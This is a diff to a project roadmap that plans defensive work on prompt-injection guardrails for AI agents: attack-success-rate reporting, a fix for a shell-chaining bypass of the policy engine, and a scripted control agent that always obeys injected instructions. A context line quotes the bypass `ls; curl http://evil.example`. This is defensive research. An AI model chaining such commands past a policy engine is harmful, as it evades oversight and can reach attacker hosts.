@@ -30,7 +30,13 @@ Decimal phases appear between their surrounding integers in numeric order.
   3. A test reproducing that `ls; curl http://evil.example` passes the policy engine fails before the fix and passes after it, with every sub-command of `;`, `&&`, `||`, `|`, `$(...)` and backticks checked and the chain blocked; the Flask dashboard binds to 127.0.0.1 with debug mode off by default.
   4. A scripted worst-case control agent (always obeys the injected instruction) runs through the same benchmark and both arms, and the report shows a model-independent count of what the guardrails block given an attempt.
   5. The viva page(s) for the reference monitor / access matrix / policy engine and for evaluation statistics (ASR definitions, Wilson intervals) are added to `docs/viva/` (definition of done for every phase; DOC-03 is traced to Phase 5).
-**Plans**: TBD
+**Plans**: 4 plans
+
+Plans:
+- [ ] 01-01-PLAN.md — Honest report: outcome taxonomy, ASR-valid, Wilson k/n cells, completeness gate, pair dropping, utility both arms, conditional block rate (wave 1)
+- [ ] 01-02-PLAN.md — Shell-chaining bypass reproduced red then fixed (fail-closed parser), policy hash, dashboard on 127.0.0.1 with debug off (wave 1)
+- [ ] 01-03-PLAN.md — Provenance stamps on every record, provenance report section, paired interleaved queue, infra re-queue, manifest.json (wave 2)
+- [ ] 01-04-PLAN.md — Scripted always-comply control agent through both arms with its own report section; docs/viva Phase 1 page and index (wave 3)
 
 ### Phase 2: Local Data Foundation & ScratchGPT
 **Goal**: A language model trained from scratch on this laptop's GPU drives the agent in the benchmark as `scratch-gpt`, trained on synthetic episodes that provably contain nothing from the benchmark and rendered by the same function at training and inference time.
@@ -86,7 +92,7 @@ Phases execute in numeric order: 1 → 2 → 3 → 4 → 5 (the `hf_local` provi
 
 | Phase | Plans Complete | Status | Completed |
 |-------|----------------|--------|-----------|
-| 1. Evaluation Hardening & Policy Fix | 0/TBD | Not started | - |
+| 1. Evaluation Hardening & Policy Fix | 0/4 | Planned | - |
 | 2. Local Data Foundation & ScratchGPT | 0/TBD | Not started | - |
 | 3. Qwen LoRA & hf_local Provider | 0/TBD | Not started | - |
 | 4. Full Runs - Local, Added Ollama, Hosted Resume | 0/TBD | Not started | - |
